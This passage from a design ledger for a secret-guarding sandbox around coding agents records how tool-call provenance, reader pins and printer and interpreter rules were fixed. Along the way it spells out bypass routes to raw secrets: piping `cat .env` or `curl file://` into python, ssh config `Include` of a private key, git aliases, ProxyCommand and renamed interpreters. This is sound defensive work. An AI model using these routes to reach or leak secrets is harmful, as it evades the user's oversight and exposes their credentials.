throw) and `no-delay` component test (`setNoDelay(true)` on the accepted
connection, the inspected leg's pooled upstream and the blind tunnel's
upstream, watched on the real sockets; both requests arrive whole). No
latency assertion: under load it would flake.

**D7. The tool-call tree was guessed, and had holes.**

- *No production recorder.* `callTaint` took "the most recent exec with this
  command signature" as a call's root. Claude Code runs each Bash call as
  `zsh -c 'source <snapshot> … && eval '<command>' …'`, so its shell never
  matched; two runs of one command could bind to the wrong tree; a miss left
  no mask. *Fixed by the call-root recorder:*
  - *The correlation, with zero agent cooperation.* The agent runs every
    shell tool call in a shell of its own, its direct child. The guard knows
    the agent (the launch's `agentExe`, `guard_flow::agent_keys`) and reports
    an exec whose parent is the agent as `callRoot`. The arbiter lists such
    an exec under every command signature it can be the root of
    (`rootSignaturesOfArgv`: `bash -lc <command>` for Codex, OpenCode and
    OpenClaw; the word after each `eval` for Claude Code). The model proxy
    records each call's command on the human plane when it relays it (the D9
    follow-up). A call binds to the candidates of that recorded command no
    older than its relay and no younger than its first ask (a later exec
    never binds a call already answered). One candidate: `exact`. Several
    (the same text run concurrently): folded over all of them (`shared`).
  - *Fail-closed.* A call the recorder cannot bind is masked whole at the
    strictest level of every raw read of the session while the session holds
    one (`heldSessionTaint`); `recordCallRoot` claims and the old guess are
    folded but never lower that.
  - *A lost shell record.* A call whose own shell record was lost while a
    same-text shell of another live call sat in its window would bind to
    that clean shell. The recorder counts, per command, the calls whose
    windows may own the candidate shells; more calls than shells and no call
    is bound by them (`ProvenanceStore.outnumbered`): each is masked while
    the session holds a raw read.
  - *The windows' clock.* Window bounds compared wall-clock milliseconds
    inclusively, so reports handled in one millisecond counted as
    simultaneous, and a clock stepping back reordered them (seen as a flaky
    mask under load). The provenance store stamps every record on its own
    strictly increasing clock (`ProvenanceStore.tick`).
  - *The clock across a restart (2026-10-17).* The records live in mandu.db
    and outlive the arbiter; the clock did not: a new process started it at
    the wall clock. After a restart across a backward wall-clock step (a
    clock that ran fast and was corrected, a VM resumed), every new stamp
    sorted BEFORE the stored ones, and each window opened before the
    restart was judged against stamps that were not ordered with it. What
    went wrong, by decision:
    - *Fail-open (a confidentiality bug).* An agent flow opened before the
      restart (§4.5.1: the agent connected to a holder) counted in no
      later call's window (`agentFlowsOverlapping`: opened after the
      window's end), so the agent's own receipt from the holder (a fetch, an
      MCP reply) and a side call (`sideCallAgentTaint`) reached the model
      unmasked; and an orphan root first seen after the restart folded into
      no call relayed before it (`orphanRootsFor`: first seen before the
      relay), so a call bound before the restart passed its later result
      (a background poll of the task whose orphaned subshell read the
      secret) raw.
    - *Fail-closed (utility).* A call relayed before the restart and first
      asked after it had an empty window (its ask before its relay): no
      shell bound, masked whole at the session's level; every orphan root
      first seen before the restart folded into every later call; and a
      shell of an older same-text call could fall in a new call's window,
      where the lost-record rule (`outnumbered`) left it unbound. Display
      only: the unattributed egress refusals of a call (`unattributedEgressRefusalsFor`)
      and the shim runs it explains.
    *Fixed:* a new store starts its clock at the newest stamp it holds
    (`storedClockFloor`, the maximum over every stamp column the store
    writes, `STORE_STAMP_COLUMNS`; a unit test fails on a time column of
    the schema the list misses), and each stamp is max(wall, last + step):
    a hybrid logical clock whose persisted state is the records themselves,
    so nothing more is written per stamp. While the wall clock is behind
    the floor the stamps run on in steps of `STORE_CLOCK_STEP_MS` above it,
    and the wall clock takes over once it passes it. The stamps order
    records and are read as nothing else (no duration is computed from
    them), except the secrets panel's "since" (`listSecretTaint`), which
    now reads the wall clock's time of the read, kept apart in
    `process_secret_taint.wall_at` (a nullable column added in place; a row
    from before reads its stamp, which was the wall clock then). Also: the
    store's default wall clock reads `Date.now` at each stamp instead of
    capturing it, so a test that replaces it reaches the store. Tests:
    `provenance-store.test.ts` (the four *across a restart* tests and the
    stamp-column inventory), `arbiter/test/component/provenance-clock-restart.test.ts`
    (two ArbiterServers on one mandu.db, the clock three hours back: the
    orphan's read folds into the bound call, the agent flow masks a later
    receipt, a pre-restart call binds its post-restart shell, a later call
    is not masked by an older orphan), `tests/stack/provenance-clock-restart.test.ts`
    (the anthropic-proxy's production adapter and its rewrite: a WebFetch
    result from a holder the agent connected to before the restart reaches
    the model as a symbol). Each fails without the floor.
  - *The signature's quoting (2026-10-03, D8 leftover (5)).* The signature
    a call binds by (`exec-signature.ts`) read a shell `-c` payload wrong in
    two ways. It stripped one more layer of quotes off a payload the shell
    had already unquoted, so Codex's, OpenCode's and OpenClaw's `bash -lc
    '<command>'` for a command that starts and ends with the same quote
    character (`"$H" "$F" | tr -d " \n"`) matched no call and was masked
    whole (fail-closed, a utility bug). And it joined the words with spaces,
    so `echo "a b"` and `echo a b` shared a signature, as did a command and
    the same command inside one more pair of quotes: a call whose own shell
    record was lost could bind `exact` to such a near-twin and reach the
    model raw (a confidentiality bug, narrow: it needs the lost record and
    the near-twin's exec by the agent's child in the call's window). Now the
    payload is tokenized once, as it stands, and the signature writes the
    words back in one canonical quoting (a word with no whitespace, quote or
    backslash bare, any other and an empty word single-quoted, joined by
    single spaces): injective on the tokenizer's word lists. The keys built
    on it tighten the same way: the exec gate's correlation and an exec
    escalation's verdict (`exec-escalate:`, keyed by the exact words; an
    *Always* given before for a command with a quoted multi-word argument is
    asked again once).
  - *Utility cost, accepted.* In a session where some reader has read a
    secret raw, every result Mandu cannot tie to a shell of the agent is
    masked whole: a `BashOutput` / `TaskOutput` poll of a task whose start
    is not in the request, or of a background subagent (a poll of a
    background `Bash` call of the request is tied to that call since
    2026-10-09, plan 10 §11.12), an MCP server's command tool,
    an agent running commands through a persistent shell, a launch with no
    `agentExe`, and two same-text calls run at once when either tree read the
    secret. A Bash call bound to a clean shell stays raw.
  - *Codex under its own sandbox (2026-10-09).* Codex runs a sandboxed
    command through its helper (`codex-linux-sandbox`), the agent's child,
    whose argv the guard records cut inside the shell-snapshot preamble
    (an argv element over the guard's per-element bound ends the record),
    so no candidate carried the command's text: every such call was
    unbound, masked at the session's level while the session held a raw
    read. The helper is now a candidate root for the ONE command shell its
    plumbing started (`codexSandboxCommandShell`, provenance-store.ts), and
    the binding is to the HELPER, so the whole sandbox tree folds. The
    trees, read off real `codex exec` runs: 0.159.1 to 0.162.0, helper →
    bwrap → helper (pid 1 inside) → shell (`zsh -c <preamble>`, then
    `zsh -c <command>`); 0.144.1, helper → bwrap → bwrap (a fork) → one
    process that execs the helper (`--apply-seccomp-then-exec`), the
    preamble, then the command's shell. The walk follows the guard's own
    lineage edges (never a claimed one) down through plumbing processes
    only (every exec the helper or bwrap, or none); in each process
    reached, its first exec that is neither plumbing nor the preamble is
    its command shell when it is a shell `-c` with its payload. A later
    exec of that process (the command `exec`ing another shell) and every
    process below a non-plumbing one (the command's own children) are
    never read, and a helper under which two command shells of different
    text ran (an orphan of the command, re-parented to the sandbox's pid
    1, that execs a shell) is AMBIGUOUS: no candidate for any call, which
    stay unbound (the session's level). The shell must have been exec'd in
    the call's window, as any candidate. Residual: a forged shell counts
    only where the helper's own command shell record was lost (then the
    forged text, if it is another live call's, may bind that call to this
    helper, `shared` with the call's own helper when that one's record
    arrived, `exact` only when both records were lost). The helper is
    recognized by its argv, not its policy flag, so the older
    `--sandbox-policy` spelling binds the same way. Tests:
    `arbiter/test/unit/codex-sandbox-binding.test.ts` (both trees, with and
    without the snapshot, the forged and ambiguous shells, a claimed edge,
    the window), `tests/sandbox/launcher/codex-sandbox-call-binding.test.ts`
    (the real `codex exec` under its sandbox: a reader's call masked by
    its tree, a clean call after it raw; before, both at the session's
    level).
  - *A background poll's output as evidence (2026-10-09).* The value
    backstop counts an exec-output row (Bash, BashOutput, …) only when
    its own call's tree held a secret, and a `BashOutput` poll's id binds
    none, so a masked poll of a secret-reading task never counted: what
    the task printed (the secret in hex, say, past the file's own
    fingerprints) passed in a later clean call's result. The
    anthropic-proxy's ask for a tied poll (plan 10 §11.12) carries the
    poll's id (`callTaint` `forPoll`); from the human plane the arbiter
    records the tie (`call_polls`), and the poll's row counts by the tied
    call's tree. A poll tied to a clean call, an untied poll and a tie
    claimed from the data socket add nothing (a precautionary row would
    mask its own text forever). Tests: `arbiter/test/unit/poll-evidence.test.ts`,
    the second test of `tests/stack/claude-background-poll.test.ts`.
- *Fork without exec.* Lineage edges were recorded at an exec or a secret
  open; a subshell that never execs (`( … )`, `{ …; } | cat`, `$(a; b)`)
  got no edge, so the walk never reached a reader under it. *Fixed:* the
  guard sends the live ancestor chain with every exec and every secret open
  (`recordExecRoot` `ancestors`, `decideSecretOpen` `ancestorKeys`), and the
  arbiter keeps the first edge of each child (a later report, after a
  reparenting, cannot cut a reader out). No fork trap: the bubblewrap wrap
  forbids one.
  - *The orphan subshell.* A subshell whose first exec or open came after its
    parent (the call's shell) exited was re-parented to a reaper first, so
    no edge linked it to the call, yet its output still went into the call's
    stdout pipe. The guard now names the ORPHAN ROOT of every exec and secret
    open whose chain holds no agent process (the topmost ancestor whose
    parent reaps orphans, born after the agent; `lineage::orphan_root_report`),
    and the arbiter folds that root's taint into every call relayed no later
    than it was first seen. Nothing narrower is sound (the lost parent is
    gone; a session id is a pid a fork loop can reuse). Utility cost: when an
    orphaned process reads a secret raw, every earlier call's result is
    masked from then on, history included.
- *Reparenting.* The guard's own inheritance check walked live `/proc`
  parents, which a reader's exit breaks. *Fixed:* the guard's checks use the
  orphan backstop (`exec-routing.md` §7.5 gap (d)), the arbiter's tree keeps
  first edges, and under a secret policy the guard's filter refuses `clone`
  with `CLONE_PARENT` (`EPERM`) and `clone3` (`ENOSYS`, so callers fall back
  to `clone`) for the whole tree, so every process a holder starts is its
  child.

Tests: `provenance-store.test.ts` and `provenance-ipc.test.ts` (the D7
blocks: binding by text, folding, unknown trees, claimed roots, forged later
shells, the lost record, the clock, the orphan root), `exec-correlation.test.ts`,
`exec-signature-quoting.test.ts` (each agent's shell shape for quoted
commands; missing and extra quotes, near misses and a payload equal to
another call's command after one more unquoting never share a signature),
`lineage.rs`, `tests/stack/call-root-recorder.test.ts`,
`tests/stack/call-binding-clock.test.ts`,
`tests/stack/quoted-payload-binding.test.ts` (through the real
AnthropicProxy: a quoted clean call binds to its shell and is raw; a lost
call beside a shell of its command in one more quote layer is masked), and
under the real guard
`tests/sandbox/guard/call-tree.test.ts` (Claude Code's shell shape, the three
subshell shapes, the orphan subshell).

**D8. A reader's identity was weaker than its pin.** Each of the following
was fixed on 2026-10-02 or 2026-10-03; the rules are Plan 10 §2.3's, extended.

- *The verdict key.* A human verdict on an open was keyed by the program's
  basename, so approving `psql` once admitted any binary named `psql`. Now
  `open:<exe>#<sha256>` (`openVerdictSubject`, Plan 10 §11.1).
- *The first-use pin.* A bare-name reader was pinned to whichever binary
  first used the name, possibly the agent's own. Now the guard reports
  whether the inode and every directory above it are out of the agent's
  reach (`exeSystem`, `reader_identity.rs`); a first-use pin is taken only
  from such a binary, any other is asked about or refused. The hash comes
  from `/proc/<pid>/exe`, cached by inode. "Out of reach" reads more than
  the mode bits, failing closed (P0 2d, 2026-10-07): an inode with a POSIX
  ACL beyond its three base entries (a named user or group, a mask, read
  or write alike), a directory with a default ACL, any NFSv4 ACL, and an
  ACL attribute that cannot be read count as in reach; so does every file
  when the agent's user may use a capability that overrides file
  permissions in the initial user namespace (the guard's `CapPrm | CapEff`:
  every capability but the network, scheduling, clock, lease, audit and
  wake-alarm ones; the agent's tree runs under `no_new_privs` from the
  guard's fork, so it holds none the guard lacks). In a child user
  namespace such a capability reaches mapped owners only, as root there
  does. Cost: a binary on NFSv4 (which reports an ACL for every file) or
  under a directory with any ACL is never out of reach, so a bare-name pin
  there is asked about; two or three `getxattr` calls per path component
  checked.
- *The loader environment.* A pinned program run with `LD_PRELOAD`,
  `LD_LIBRARY_PATH` or its interpreter's equivalent (`PYTHONPATH`,
  `NODE_OPTIONS`; OpenSSL's `OPENSSL_CONF` / `_ENGINES` / `_MODULES`) runs the
  agent's code. The guard reports every such variable set to a value the
  launch did not give (`openerEnv`) and every executable mapping the agent
  could have written (`/proc/<pid>/maps`); such an opener, or one whose
  environment was not reported, is no reader, spends no *once* and is never
  prompted for.
- *`from:`* matched ancestor basenames, which a program chooses. Now only a
  trusted ancestor (out of reach, clean environment, `ancestorTrusted`)
  counts; the ssh-agent socket's readers follow the same facts in the guard
  (`socket_reader_match`).
- *`from:` ends at the session* (security fix, 2026-10-17). The guard's
  ancestor walk (`reader_identity::ancestors`) went on past the guard to
  pid 1, so whatever started `mandu` was a `from:` parent of every opener in
  the session: a `python3` subreaper above a CI harness turned eight of
  `secret-readers-live.test.sh`'s refusals into raw reads (sh's
  `sha256sum`, a shell renamed `python3`, sh's `ssh-add` on the agent
  socket), and an IDE's or a notebook's terminal running `python3` or
  `node` would do the same for a user. The design meant the session's
  processes: `{ app: ssh, from: git }` is "an ssh that git started", the git
  the agent ran. Now the walk is `lineage::session_ancestors`: the opener's
  ancestors strictly below the guard (the walking process, the tree's
  subreaper; the same bound as D7's `chain_continues`), and none at all
  unless the chain is anchored there: every link read, the guard met within
  256 links, no init before it, no parent started after its child (a
  number reused mid-walk). A process re-parented out of the guard's tree
  (to a subreaper above it, to init) or to the guard itself has no `from:`
  parent, since its real parents are gone; an ancestor whose start time
  changed while its facts were read ends the list. Pinned by the unit tests
  of `lineage.rs` and `reader_identity.rs` and step (17) of
  `secret-readers-live.test.sh` (the guard started by a python3 subreaper:
  the refusals stand, a python3 inside the session still is a parent).
  What it does not close: a parent's number reused, within the same clock
  tick, by another process of the same session (both inside the session).
- *The write exit.* A held change to a protected file was keyed `write:<name>`;
  now `write:<exe>#<sha256>` with the same identity facts
  (write-protection.md §2.1).
- *R5, the `(interpreter, script)` pin.* An entry may name the script an
  interpreter runs: `{ app: python3, script: /opt/tools/report.py,
  scriptSha256?, output? }`. For an opener that is python, node, a POSIX
  shell or perl, the guard reports the script it runs (`script_identity.rs`):
  the operand from `/proc/<pid>/cmdline` by the family's own grammar (inline
  code, a module or preload, standard input, an interactive shell, an
  option off a short allowlist, a relative or non-canonical path are no
  script), whether the file and its directories are out of reach, its
  sha256, whether the interpreter is isolated from per-user code (python
  `-I`/`-s` or `PYTHONNOUSERSITE`; node `--no-global-search-paths`; zsh
  `-f`), and whether another process traces it. The arbiter matches only
  when every fact holds and the hash agrees; the fold takes a script entry's
  `output:` only for a row whose process started no other program. Utility
  cost: python without `-I`/`-s`, node without the flag, a relative or
  symlinked script path, a traced run.
- *Decision (b): a bare interpreter reader admits nothing.* A reader entry
  naming only a program that runs code it is given (`readerRunsCode`, the
  code-running list: shells, interpreters, launchers such as `env`, `xargs`,
  `awk`, `make`) admits nothing (`entryAdmitsNothing`), not even a script
  that passes R5's other checks: an out-of-reach script is not a vetted one
  (a system REPL such as `code.py` runs what it reads on standard input). Such
  an opener is a reader only as a pinned script (`inlineCodeProblem`); with
  none it gets the twin where non-readers get it and is refused otherwise,
  never prompted for (an Inbox row would put code nobody showed the human
  behind their *Allow*), and no prior verdict counts. The consumer table
  follows: `node`, the default reader of `~/.npmrc`, is one only as a pinned
  script, so npm reads its `.npmrc` through the wire twin (Plan 10
  §11.13.1). An *Always* for an interpreter running a pinnable script writes
  the script pin. The validator warns rather than refuses, so a law written
  before still loads; the dashboard and `mandu why` mark the entry "(admits
  nothing)". Utility cost: `readers: [bash]` with `bash -c '. .env; deploy'`,
  a dev server run as `node server.js` reading `.env`, an MCP server run by
  `node` reading its key, npm with a non-servable `.npmrc`. The way out
  (`docs/usage.md`, "Secrets in `policy.yaml`"): name the leaf program that
  needs the file, or pin a script of your own with its interpreter.
- *Decision (c): verdicts key an interpreter by its script.* `open:` and
  `write:` subjects for a program that runs code name the script when R5's
  checks pin one: `<kind>:<exe>#<sha256>#script:<path>#<sha256>`. One
  running no pinnable script gets no reusable answer: an open is refused
  unprompted (b); a held protected write is asked about each run
  (`write:<exe>#<sha256>#run:<procKey>`, an *Always* kept as once), since the
  agent's shell appending to `~/.bashrc` at the human's request is ordinary
  work with no script to pin. Rows naming an interpreter alone match nothing
  and are shown as no longer applying (`staleInterpreterVerdict`); a
  pending one is retired (the !437 leftover (4), below). Subjects
  are one-to-one (a path containing `#script:` or `#run:` gets none; paths
  and keys are URI-encoded).
- *Code by argument.* The pin says which binary runs, not what it is told to
  run: `git -c alias.x='!sh'`, `GIT_SSH_COMMAND`, `ssh -o ProxyCommand=…`,
  `scp -S`, `sftp -b`, `psql -f`, `less +cmd` / `LESSOPEN`, `sed` with `e`,
  `tar --to-command`, `rsync -e`, an editor. The guard reports, by NAME and
  never by value, each option or variable that hands code to git, ssh, scp,
  sftp, ssh-add, psql, less, sed, tar or rsync (`args_code.rs`, allowlists
  where the grammar allows; a variable set to the launch's own value is the
  human's). The arbiter treats an `args:` finding as code
  (`argsCodeProblem`): no reader, never prompted for, no prior verdict, a
  protected write keyed by its run; in the guard such an ancestor is no
  trusted `from:` parent and such a socket client no reader. Editors,
  debuggers, tracers, `sqlite3`, `expect`, `m4` and more launchers (`time`,
  `parallel`, `flock`, `chroot`, `unshare`, `nsenter`, `bwrap`, `su`,
  `systemd-run`, …) join the code-running list, whose copies (arbiter,
  dashboard, guard) are pinned equal by `tests/stack/reader-identity.test.ts`.
  Not covered here: a code option no rule lists; credential plugins that
  run as children (kubectl, aws, gh, docker, helm).
- *A configuration file the reader reads (2026-10-07, P0 (D)).* A
  configuration FILE the agent can write steers a program as an option
  does: `.git/config` (`core.pager`, an alias, `credential.helper`),
  `~/.psqlrc`, `~/.lesskey` / `LESSOPEN`, `~/.my.cnf`'s `pager`,
  `~/.ssh/config`. The inventory against the allow-list of (12): the only
  programs that read raw without the human's word are the vetted `ssh` and
  `ssh-add`. git, psql and less are printers, so whatever their
  configuration runs sees only placeholders; the other SQL and database
  shells join them (`mysql`, `mariadb`, `mysqlsh`, `duckdb`, `usql`,
  `sqlcmd`, `sqlplus`, `clickhouse`, `clickhouse-client`,
  `clickhouse-local`, `mongosh`, `mongo`: each prints a file it is pointed
  at and runs a command it is given, from its rc file too; listed
  fail-closed from their documented commands, unprobed), in the three
  copies. `ssh-add` reads no configuration file (its code options and
  variables are `args_code.rs`'s). `ssh` reads `~/.ssh/config` (protected;
  served as its twin, which withholds commands off the grammar, plan 10
  §11.13) and every file it `Include`s, which was writable:
  `Include ~/.ssh/id_ed25519` in an included file makes ssh print each line
  of the key as a bad keyword (probed, OpenSSH 10.2), so ssh became a
  printer of its own key. Every include target (followed from
  `~/.ssh/config` and `/etc/ssh/ssh_config`) is now on the write-protect
  list, and a rename or new name above any entry is judged as a change to
  it (write-protection.md §2). Left: an include too broad to hold (warned
  at launch); the configuration files of a program the human vouches for
  (`prints: nothing`), which Mandu does not know and the word covers.
  Tests: `reader-allow-list.test.ts` (the shells, red before),
  `ssh-config-includes.test.ts`, the guard's ancestor unit and kernel
  tests, `tests/sandbox/guard/ssh-config-write-protect.test.ts`.
- *Printers admit nothing (2026-10-03).* Decision (b) left a road: a listed
  reader that prints the file (`cat`, `head`) hands the bytes to whatever
  reads its output, so `cat .env | python3 -c '…'` ran the agent's code with
  the raw secret. That holder was held at every content exit (the model, the
  bindings over TCP and UDP, its children, the files it writes, flows to
  other processes, `/proc`; `tests/sandbox/guard/printer-downstream.test.ts`)
  but not at the metadata exits of §4.9 (the names of files it creates,
  sizes, times), which for the agent's own code are a channel of any
  bandwidth. Registering every name a holder creates was weighed and
  rejected (each new metadata exit would reopen it). Decision: the names gap
  is accepted for vetted readers, and no generic printer ever gets the raw
  bytes. A program whose job is to print, copy, encode, filter, compare,
  convert, compress or archive a file, or that can print one when asked
  (`PRINTER_READERS`, `readerPrints`; by basename, under a distribution's
  `gnu`/`g`/`uu-`/`uu_` prefix, and every file under uutils'
  `/usr/lib/cargo/bin/coreutils/`), admits nothing as a reader in any form,
  a pin by path and hash included; gets what a non-reader gets; is never
  prompted for; and no past answer for it counts. The list covers
  `cat`/`head`/`less`-style pagers, `cp`/`tee`/`dd`/`rsync`/`socat`,
  `base64`/`xxd`/`od`/`strings`, `sed`/`awk`/`grep`/`sort`/`cut`-style
  filters, `diff`/`cmp`, `iconv`, the compressors and archivers, `jq`/`yq`
  and their kin, `openssl`, `gpg`, `nano`/`micro`, the multi-call
  binaries (`busybox`, `toybox`, `coreutils`), the programs that fetch or
  transfer a URL or a file (the !437 leftover (1), below), and, by content,
  any binary byte-identical to a printer installed on the host (leftover
  (2)). The other vetted consumers of the consumer table (`psql`, `aws`,
  `gh`, `npm`, `ssh`, …) are unchanged; its `curl` and `scp` are
  printers since leftover (1), and `git` since 2026-10-04 ((11) below,
  §4.9). Not covered: a printer that is not
  byte-identical to one installed on the host (another version, a build of
  its own, a downloaded static binary) pinned under another name, or a
  program of the human's own that prints; a pinned script that prints. The
  human vouches for what they pin. Utility cost: `readers: [cat]` and the like
  give no raw bytes; `. <(cat .env)` hands on the twin; on a host whose
  coreutils is uutils, no coreutils program is a reader. The way out is to
  name the program that uses the secret.
- *(3a) Launchers under every name, and relays.* The code-running list is
  matched like the printer list, under the same distribution prefixes
  (`READER_NAME_PREFIXES`: `gnuenv`, `gnutimeout`, `genv`, `gmake`,
  `uu-env`) and by uutils' directory, and includes `toybox`, `coreutils` and
  the relays that run a program from their arguments (`nc`, `ncat`,
  `netcat`, `socat`).
- *(3b) The ssh-agent socket's readers follow the printer rule.* The guard
  carries a copy of `PRINTER_READERS` (pinned to the arbiter's), and
  `socket_reader_match` refuses a connecting program that runs code or
  prints, and skips an entry naming one: otherwise a relay on the list lets
  the agent's code sign with the human's keys. A leaf program (`ssh-add`,
  `ssh` under `git`) still connects.
- *(1) A program that fetches or transfers a URL or a file is a printer
  (the !437 leftover (1), 2026-10-03).* `curl` named in a file's `readers:`
  (for `.netrc`) let `curl file:///w/.env | python3 x.py` hand the agent's
  code the raw bytes. A tool joins `PRINTER_READERS` (its four copies: the
  arbiter, the dashboard, the guard; pinned equal by the stack parity test)
  when printing or copying an arbitrary named local file is one of its
  normal modes: `curl`, `curlie` (`file://`), `wget`, `wget2` (`-i <file>`
  reports each line it cannot use), `aria2c` (`-i`), httpie's `http` /
  `https`, `xh` / `xhs` (`--offline … @<file>`), `lftp` (`cat file:…`),
  `rclone` (`cat <local path>`), `scp` and `sftp` (local copies), `gio`,
  `gvfs-cat`, `gvfs-copy`, KDE's `kioclient*`, and the text browsers `lynx`,
  `w3m`, `links`, `links2`, `elinks` (`-dump file://…`). Not printers by the
  same test: `nc`, `ncat`, `netcat` (no mode reads a named file; they run
  code, (3a)), `axel` (URLs only), the tnftp `ftp` client (it runs
  commands instead: on the code-running list since (6)), and `ssh` (it
  signs with the key). The printer rule wins over a consumer-table row
  (`decideOpen` judges a printer first), except that a consumer-table
  printer still gets the twin the wire release serves it (Plan 10
  §11.13.1), so `curl` with `.netrc` under TLS inspection (the `secrets`
  default) works as before. Utility cost: these tools as a file's reader
  give no raw byte; without the wire release (`MANDU_WIRE_TWIN=0`, or TLS
  inspection off) `curl --netrc` and `wget` get `.netrc`'s twin and their
  login fails; a token file `curl -H @file` reads is the twin. `scp` named
  for an ssh key costs nothing (the `ssh` it runs opens the key).
- *(2) A copy of a printer under another name is that printer (the !437
  leftover (2)).* The arbiter hashes the printers installed on the host
  (`printer-hashes.ts`, since (5) `program-hashes.ts`: every file of the system bin directories and uutils'
  multi-call directory whose name or path `readerPrints` names, resolved
  through links; a fixed list of directories, never `$PATH`, which can hold
  one the agent writes; each inode read once and cached by mtime and size;
  at start and at most every ten minutes before a secret open). A binary
  with one of those hashes is a printer under any name and in any place
  (`hashPrints`, `binaryPrints`): a pin `{ app: mytool, path, sha256 }` whose
  hash is one admits nothing, and an opener whose hash is one gets what a
  non-reader gets, with a reason saying it is a printer's copy; an old
  answer about it is a printer's (`printerOpenVerdict`). `policyWarnings`
  and `mandu why` (`whyPath`'s `readersPrint`) name such a pin; the
  dashboard shows the arbiter's judgment of it (since (8)). Not
  covered: a printer not byte-identical to one installed here, one
  installed after the last scan until the next, and a pinned script that
  prints.
- *(4) A question that can no longer take effect is retired (the !437
  leftover (4)).* A pending Inbox row an older arbiter filed about a printer
  (`open:` a printer, or a printer's copy by its hash) or about an
  interpreter alone (`open:` / `write:` with no script, before decisions (b)
  and (c)) is consulted for no opener, so an answer would change nothing
  (`mootQuestionReason`). The arbiter retires such rows: at start (after the
  host's printers are hashed) and before every listing and every answer,
  `retireMootQuestions` removes each from the store and the DB
  (`EgressApprovalStore.withdraw`, the pending-only counterpart of
  `forget`) and logs it. Removed rather than given a terminal status: the
  row never held an answer, and a new status would reach every reader of
  `status` (the gates, the dashboard, `mandu why`) for a row no one may
  see. Fail-closed: only a PENDING row is removed, never an answer; with no
  prior answer the gate decides by the law (a printer gets what a
  non-reader gets, an interpreter alone is refused), and a guard still
  holding the open re-asks and gets that answer, neither a hang nor a pass.
  An answer from a stale page is refused with the reason while this arbiter
  runs (the dashboard's route answers 409), and as an unknown id after a
  restart. Ids are never reused: the store persists its id counter's
  high-water mark (`egress_approvals_seq`), so a stale *Allow* cannot land
  on a later question (this also closes the same reuse after `forget`). An
  ANSWERED old row stays listed and marked. Since 2026-10-11 a row naming a
  program by its name only (`open:ssh-add`, `write:nano`, the form before
  2026-10-02; `nameOnlyVerdict`) is moot too, checked last, and every
  listing marks an answered moot row (`noLongerApplies`), so the Approvals
  page and Rules say it applies to nothing and offer no change to it
  (dashboard.md §4.34 "Answers that no longer apply"). An opener with no
  absolute path files no question.
- *(5) A copy of a code-running program under another name is that program
  (2026-10-03).* Decision (b) judged a program by its name, so the human's
  `cp /usr/bin/python3 ~/bin/mytool` pinned as `{ app: mytool, path,
  sha256 }` was that pin's program: it read the secret raw and ran whatever
  code the agent handed it (`mytool -c '…'`). The printer scan of (2) is
  generalized (`program-hashes.ts`, was `printer-hashes.ts`): one pass over
  the same directories hashes every file `readerPrints` or `readerRunsCode`
  names, resolved through links, each kind once per inode, and keeps the
  name of the file each hash was found as (`python3.12`). A binary with a
  code-running program's hash is that program under any name and in any
  place (`hashRunsCode`, `binaryRunsCode`, `openerRunsCode`): a pin whose
  hash is one admits nothing (`entryAdmitsNothing`), a `script:` pin on a
  renamed copy included (a script pin's interpreter is named by its
  `app:`, which a copy does not carry; the installed interpreter's own
  script pin at another path is unchanged); an opener whose hash is one is
  no reader (`matchReader`, `inlineCodeProblem`), has no verdict key
  (`verdictProgramOf`), is never prompted for, gets what a non-reader gets
  with a reason naming what it is a copy of, and an old answer about it
  naming no script applies to nothing (`staleInterpreterVerdict`, retired
  when pending as in (4)). `policyWarnings` and `mandu why` (`whyPath`'s
  `readersCopyOf`, `renamedCopyOf`) say "mytool is a copy of python3.12"
  and name the installed interpreter's script form. The guard's socket
  list and the dashboard judged by name only until (8). Cost: the first scan reads the code-running binaries too
  (about 70 files, a quarter of a second on a desktop host; a re-scan only
  stats); a renamed copy of an installed interpreter or launcher reads no
  secret raw, even pinned (the way out: name the leaf program, or pin a
  script with the installed interpreter). Not covered: an interpreter not
  byte-identical to one installed in the scanned directories (another
  version, a static or version-manager build under `$HOME`; closed by its
  content in (8)), one installed after the last scan until the next.
- *(6) More programs that run a command join the code-running list
  (2026-10-03).* Fetch and transfer clients that run a command they are
  given, by an option or by an rc file in `$HOME` the agent can write: the
  ftp clients (`ftp`, `tnftp`, `netkit-ftp`, `pftp`, `inetutils-ftp`: `!cmd`,
  `get f |cmd`, `.netrc` macros), `aria2c` (`--on-download-start`,
  `-pause`, `-stop`, `-complete`, `-error`, `--on-bt-download-complete`, also
  from `~/.aria2/aria2.conf`), `lftp` (`!`, `shell`), `sftp` (`!`), `wget`
  and `wget2` (`--use-askpass=<command>`, also from the rc file; wget2's
  `--plugin`), `rclone` (`--password-command`, backend commands), `gio`
  (`launch`), `kioclient*` (`exec`), the text browsers (`!`, mailcap
  viewers, local CGI) and httpie (plugins). Most were printers already
  ((1)), so a file reader gains nothing new; the change names them for what
  they are on every surface (the ssh-agent socket's list, the moot-question
  rule, a protected write keyed by its run). With them, more editors that
  run a command or load code from an rc file (`nvi`, `elvis`, `vis`, `kak`,
  `hx`/`helix`, the `joe` family, `jed`, `mg`, `zile`, `jove`, `mcedit`,
  `mc`, `ne`, `xemacs`) and more launchers (`valgrind`, `perf`, `rr`,
  `setpriv`, `sg`, `unbuffer`, `faketime`, `torsocks`, `proxychains*`,
  `fakeroot`, `eatmydata`, `xvfb-run`, `dbus-run-session`, `tmux`, `screen`,
  `entr`). All copies (arbiter, dashboard, guard) stay pinned equal by
  `tests/stack/reader-identity.test.ts`. Not made code-running: `curl`,
  `curlie`, `xh`, `scp`, `gvfs-cat` (no command of their own; `scp -S` is
  code by argument, `args_code.rs`). Cost: none for a file's reader beyond
  (1), except the ftp clients, which read nothing raw now; one of these
  named on the ssh-agent socket's list admits nothing; a protected write by
  `wget` or `aria2c` is asked about per run; MinIO's client, also called
  `mc`, is caught by the name (it prints a local file anyway).
- *(7) `vim -c` and modelines: closed since !368.* A ledger note had `vim
  -c` and modelines outside the code-running list. The editors joined it
  with *Code by argument* (above, !368): `vi`, `vim`, `nvim`, `ex`, `view`,
  `rvim`, `rview`, `vimdiff`, `gvim`, `gview`, `evim`, `vimx`, `emacs`,
  `emacsclient`, `ed`, `red` (and `vim.basic` / `vim.tiny` by the
  alternatives suffix). Such a reader admits nothing named alone or pinned
  by path and hash; no editor has a script form (`scriptInterpreterFamily`),
  so a `script:` entry for one matches nothing and its opener is refused
  unprompted, whatever `-c`, `+cmd`, a modeline or a vimrc would run. A
  renamed copy of one is caught by (5). Pinned by
  `arbiter/test/unit/args-code-reader.test.ts` and
  `code-runner-copies.test.ts` (3).
- *(8) The renamed-copy fix's leftovers (2026-10-03).* Three gaps (5) left,
  each closed fail-closed and simple (the maintainer's rule: losing some
  utility is fine):
  - *An interpreter by its content.* A python, node or busybox that is not
